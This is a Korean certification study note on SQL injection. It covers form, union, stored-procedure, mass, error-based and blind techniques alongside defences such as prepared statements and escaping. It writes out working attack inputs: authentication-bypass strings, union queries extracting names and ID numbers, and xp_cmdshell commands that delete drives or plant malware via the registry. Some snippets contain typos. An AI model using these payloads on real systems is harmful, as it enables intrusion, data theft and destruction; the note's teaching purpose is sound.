---
title: 정보보안 - SQL Injection
date: '2021-06-28 19:00:00'
tags:
- 정보보안기사
- 어플리케이션
related: true
categories:
- IS_Certification
toc: true
---

# SQL Injection

## SQL Injection
- 개요
    + 코드 인젝션의 한 기법으로 클라이언트의 입력값을 조작하여 서버의 데이터베이스 공격
        * 예) 웹페이지 로그인 폼의 ID/PW 입력란에 SQL 쿼리를 삽입
    + 공격이 쉬운데 비해 파괴력이 강하기 때문에 시큐어코딩의 기본중 하나
    + Injection 계열 취약점들은 테스트를 통한 발견은 어려우나 스캐닝툴이나 코드 검증절차를 거치면 보통 쉽게 발견되기 때문에 탐지하기 쉬운 편
        * 스캐닝 툴
            - Nikto : GNU 오픈소스, 웹서버, Injection 등 취약점 점검
            - SQLMap (Python) : 블라인드 SQL Injection 점검 
            - Absinthe : 블라인드 SQL Injection 점검
    + 입력 값 필터링이 제대로 이루어지지 않는 경우 발생
- Web Application 의 일반적인 인증 절차
    + ID/PW 입력
    + SQL Query 생성
    + Database 에 쿼리 전송
    + Database 에서 쿼리 실행
- 공격방식에 따른 분류
    + Form SQL Injection
        * 구조
            - HTML
                ```
                    <form>
                        <input />
                        <submit>
                    </form>
                ```
            - 웹서버
                + PHP, JSP, ASP 처리
                + 쿼리문 생성
                + WHERE 절을 TRUE 로 만든다 (공격예시)
            - DB
        * 주석처리문자
            - MySQL : # , MSSQL : --, ORACLE : --
        * URL 인코딩 (`%xx` 로 표기, xx 는 16진수)
            - `#` -> %23
            - `-` -> %2D 
            - `'` -> %27
            - `=` -> %3D
            - 공백 -> `+` 혹은 %20
            - 널문자 -> %00
            - `;` -> %3B 
        * 취약점 있는지 여부 파악 방법
            - ID 입력 란에 `'` 나 `"` 입력 후 테스트
                + Error 메시지가 출력되면 입력 값이 DB에 전달된 것 (입력검증 X) : 취약
        * 예시
            - PHP 코드 (로그인처리)
                + 취약한 코드 예시
                ```
                    $query = select id, pw from member where id='$id' and pw='$pw';
                    $result = mysql_query($query, $connect);
                    $num_rows = mysql_num_rows($result);
                    if($num_rows) {
                        $row = mysql_fetch_array($result);
                        $id = $row[id];
                        echo "로그인 성공";
                    } else {
                        echo "로그인 실패";
                    }
                ```
                + 사용자가 입력한 값을 그대로 변수에 담아옴
                + 변수에 `' or 1=1 #` 입력할 경우
                    * ID : `' or 1=1 #`
                    * pW : `test`
                ```
                    select id, pw from member where id='' or 1=1#and pw='test';
                ```
                + URI 인코딩 메시지 (HTTP 요청메시지)
                    * `id=' or 1=1#`
                    * `id=%27+or+1%3d1%23`
        * 대응책
            - PHP 설정파일 : php.ini
                + `magic_quotes_gpc=on` : GET, POST, Cookie 로 전달되는 데이터에 `'`(Single quote), `"`(Double quote), `\`(Back slash), ``(Null)(0x00) 특수문자를 일반문자로 처리 (Escape 처리)
                + 5.4 버전 이상에서는 설정값이 없고, mysql_real_escape_string() 함수 (MySQL 라이브러리 함수) 를 이용
                    ```
                        $id = mysql_real_escape_string($id)
                        $pw = mysql_real_escape_string($pw)
                        $query = select id, pw from member where id='$id' and pw='$pw';
                    ```
                    * 결과 : `select id, pw from member where id='\' or 1=1#'`
            - Prepared Statement (선처리 질의문)
                + 동적으로 쿼리를 생성하지 않음
                + 사용자의 입력값을 바인딩 처리
                    ```
                        $stmt=$conn->prepare("select id, pw from member where id=? and pw=?");
                        $stmt->bind_param($id, $pw);
                        $stmt->execute();
                    ```
                + 입력값을 제외하고 사전 컴파일 처리
                + 입력값은 명령어가 아닌 입력값으로만 처리
            - 파라미터 필터링을 이용한 SQL Injection 방지
                + 블랙리스트 생성
                    ```
                        function chk_blacklist($str){
                            $returnVal = false;
                            $blist = array('\'','\"','#','--','union','selector','update','or','and','insert','update')

                            ###for 문 체크
                                if 포함 $returnVal = true; break;
                            ###

                            return $returnVal;
                        }

                        $chk_id = chk_blacklist($id);
                        $chk_pw = chk_blacklist($pw);
                        if (chk_id || chk_pw){
                            ...
                        }
                    ```
    + Union SQL Injection
        * Union 명령어
            ```
                select id, pw from member where id='test';
                select id, pw from member where id='test' union select 'test', '1212'; -- 결과값이 같을 경우 하나로 표기
                select id, pw from member where id='test' union all select 'test', '1212'; -- 결과값이 같을 경우 중복 표기
                select id, pw from member where id='' union select 'test','1234';
            ```
            - 조건 : Union 은 필드의 개수가 똑같아야 결합 가능
        * 컬럼을 파악할 때 사용하는 명령
            `select * from member where id='' order by 4#;`
            - Error code : Unknown column '4' in 'order clause' (필드가 3개라 판단)
        * 공격방식
            - id 부분에 `' union select 'test', '1234'#` 입력
                + 오류없이 인증 우회 가능
        * 예시 : 값 비교를 통한 form SQL Injection 방어 코드
            ```
                $query = "select id, pw from member where id=$id";
                $result = mysql_query($query, $conn);
                $num_rows = mysql_num_rows($result);
                if($num_rows) {
                    $row = mysql_fetch_array($result);
                    $id = $row[id];
                    $rec_pw = $row[pw]; // 첫번째 레코드의 pw 값을 저장
                    if($pw != $rec_pw) {echo "로그인실패"} else {echo "로그인성공"}
                }
            ```
            - Union SQL Injection 에 취약
                + id : `' union' select 'test', 'test' #`
                + pw : `test`
    + Stored Procedure SQL Injection
        * 저장 프로시저는 여러 쿼리문을 하나의 함수처럼 실행하여 사용하는 쿼리의 집합을 의미
        * 특정 작업을 일괄 처리하기 위한 용도로 사용
        * 명령어
            ```
                exec master..xp_cmdshell 'dir c:\'
                exec master..xp_cmdshell 'del c:\ /q/s'
            ```
            - `exec master.dbo.xp_cmdshell '시스템명령어'`
            - 확장형 저장프로시저
                + xp_cmdshell
                    * 관리자의 권한으로 임의의 명령을 수행
                + xp_regwrite
                    * 레지스트리 작성
                + `exec master.dbo.xp_dirtree 'c:\'`
                    * 디렉토리 구조
                + 공격예시
                    * `aaa.php?tt=1234;exec master.dbo.xp_cmdshell 'ping 192.168.10.0'`
                        - 뒤의 명령도 실행됨.
                    * `aaa.php?tt=1234;exec xp_regwrite 'HKEY_LOCAL_MACHINE','\software\microsoft\window...','winhelp',REG_SZ,'c:\temp\hac.exe'`
                        - 레지스트리 키 작성, 윈도우 도움말을 볼 때 악성코드 실행
                        - `c:\temp\hac.exe` : 공격자가 심어놓은 악성코드
    + Mass SQL Injection
        * 기존의 SQL-Injection 기법보다 확장된 개념
        * 보안장비와 필터링 설정을 우회하는 기법 (2가지 방법)
            - 공격쿼리의 일부분을 HEX 인코딩
            - 전체 쿼리를 HEX 인코딩
        * 대량의 DB값이 변조되어 홈페이지에 치명적인 악영향
        * DB값 변조시 악성 스크립트를 삽입
            - 사용자들이 변조된 사이트를 방문시 감염
            - BOT이 설치되어 계정 해킹이나 DDOS 공격에 이용
        * 대상
            - 공격대상이 MS-SQL 을 사용
            - ASP 가 가동중인 IIS 웹서버
        * 특징
            - 데이터베이스에 악성코드를 대량으로 삽입
            - 자동 삽입 스크립트를 사용하여 한번에 악성코드를 대량 삽입
            - POST 나 HTTP Header (쿠키, 리퍼러) 를 이용한 경우 공격 로그를 찾기 어려움
            - 악성코드 삽입 과정에서 데이터의 손실 발생
            - `<script src=...></script>` 태그를 삽입, js, swf, exe 파일
            - HEX 코드로 인코딩 변환
                + 대상 코드
                    ```
                        begin
                            exec ('update' + @t + ' set' + @c + " = " <script> document.location = "http://www.xxx.com"</script>'")
                        end
                    ```
                + FW 등의 필터링을 우회
        * 대응방법
            - declare 구문을 이용한 공격방식 차단
                + 위해 웹 소스상의 쿼리스트링 길이 제한
                + 소스코드 수정 (중-장기 대응방안)
                + 입력문자의 필터링
                + DB, System 정기 백업

- 공격유형에 따른 분류
    + 에러 기반 SQL Injection
        * 개요
            - DB 쿼리 결과의 에러값을 이용하여 원하는 정보를 점진적으로 얻어나감
            - DB 에러가 외부로 노출되는 취약점을 이용한 공격
            - Error 메시지를 노출하지 않으면 사용할 수 없음
        * 예시
            - 테이블명 및 필드명 획득
                + having 이용
                    * 검색 창이 있을 시
                        - `select * from member ... `
                    * group by 절이 컬럼을 기준으로 그룹을 만들 때 having 은 결과를 한번 더 필터링
                    * ` having 1=1 --`
                    * 오류메시지 : member.idx 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음... '??? 의 line ?번'
                        - member : 테이블명
                        - idx : 필드명
                    * `group by idx --`
                    * 오류메시지 : member.bId 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음... '??? 의 line ?번'
                    * `group by idx, bid --` ...
            - 컬럼(필드) 타입 획득
                + sum() 이용 : 숫자형인지 여부
                + union 이용
                    * `union select sum(컬럼명) from member --`
                    * 오류메시지 : 숫자타입의 필드(컬럼) -> 동일 개수의 식이 있어야 합니다.
                    * 오류메시지 : VARCHAR 타입의 필드(컬럼) -> sum or avarage 연산에서는 varchar 타입 데이터 형식을 인수로 사용할 수 없습니다.
                + 필드의 개수를 알고 있을 때 필드의 타입을 획득하는 방법
                    * union select 에 NULL 을 활용 
                    * `union select NULL,NULL,NULL,NULL from member`
                    * `union select 1,NULL,NULL,NULL from member`
                        - 에러가 없으면 첫번째 컬럼은 Int 형
                + 필드의 개수가 파악되면 ID, PW 를 받아올 수 있음
                    * `union select idx, name, password, ...`
    + Blind SQL Injection
        * 개요
            - 쿼리의 결과가 참인지 거짓인지의 반응으로 취약점 발견
            - Limit 연산, substr(문자열 자르기), ASCII(아스키 코드 반환) 등 함수를 이용
            - 정보를 수집하고 필드값이나 테이블 명을 추측하여 공격
        * 예시
            - 쿼리부분 예 (PHP)
                ```
                    $query = "select * from bbs
                    where $find like '%$search%"
                    order by idx desc";
                ```
                + 설명
                    * `$search` : 사용자가 입력한 검색어
                    * `$find` : 제목, 내용, 작성자, 내용+제목 등
                + 검색어에 `' and 1=1#` 입력 시
                    * `where $find like '%' and 1=1#%`
                        - `$find like '%'` : True
                        - `1=1` : True
                + 검색어에 `' and 1=2#` 입력 시
                    * `where $find like '%' and 1=1#%`
                        - `$find like '%'` : True
                        - `1=2` : False
                + True 와 False 에 대한 결과로 BlindSQL Injection 가능여부를 판단
            - 스키마
                + Information_schema : DB의 구조, 제약조건 등 메타 데이터를 제공
                + Information_schema.tables : 모든 테이블에 대한 정보
                + Information_shcema.columns : 모든 테이블의 컬럼정보
            - 함수
                + limit : 출력 레코드의 개수를 제한하는 함수 (ex:limit pos,len)
                + substr : 문자열을 추출하는 함수 (ex:substr(문자열, pos, len))
                    * pos : 시작위치 / len : 문자개수
                ```
                    select table_schema, table_name, table_type from information_schema.tables
                    where table_type = 'base table' -- 사용자가 만든 테이블
                    limit 0,1 ;
                ```
                    * 사용자가 만든 테이블을 처음부터 1개 가져오기
                ```
                    select substr((select table_name from information_shcema.tables where table_type = 'base table' limit 0, 1), 1, 1) from dual;
                ```
                    * 사용자가 만든 테이블명을 처음부터 1개 가져와서 앞자리 확인
                ```
                    select column_name from information_schema.columns
                    where table_name = 'employee' 
                    limit 0, 1;
                ```
                    * 테이블명이 'employee' 인 컬럼명을 처음부터 1개 가져오기
            - 활용법
                + 검색창에 입력
                    * `' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#` 
                + 완성 쿼리 내용
                    ```
                        select * from bbs where subhect like '%
                        ' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#%'
                    ```
                    * 검색 결과값이 나오면 참, 결과값이 없으면 거짓
                    * 자동화된 툴을 이용해서 테이블 정보를 파악
        * 과정
            - Table 정보 -> 필드(Column) 정보 -> Data 획득
                + information_schema.tables, information_schema.columns, union select 이용
            - 테이블명 획득
                + `' and substr((select table_name ...),1,1)='a'#` 
                + `%27+and+substr%28%28select+table_name...`
                    * POST 의 Message Body 영역에 URIEncoding 방식으로 변경되어 전송됨
            - 컬럼정보 획득 (획득한 테이블 정보 employee)
                + `' and substr((select column_name from information_schema.columns where tablew_name='employee' limit 0,1),1,1)='a'#`
            - Data 획득 (획득한 컬럼정보 이용)
                + `' and 1=2 union select 'a','b','c','d','e','f','g','h','i'#`
                ```
                    select * from bbs where subject like '%' and 1=2 union select 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i'#%'
                ```
                    * 1=2 를 통해 원 검색결과 출력을 막음
                    * 필드개수 9개 : bbs의 필드개수와 동일하게 설정
                    * 출력 결과를 통해 웹사이트의 필드가 어떤 컬럼과 매핑되는지 확인
                + 출력위치 확인 후 해당 위치로 employee 테이블의 조회결과 출력
                + `' and 1=2 union select null,null,null,concat(name, '/', juminNo), null, null, null, null, null from employee#`
                ```
                    select * from bbs where subject like '%' and 1=2 union select null, null, null, concat(name, '/', juminNo), null, null, null, null, null from employee#%'
                ```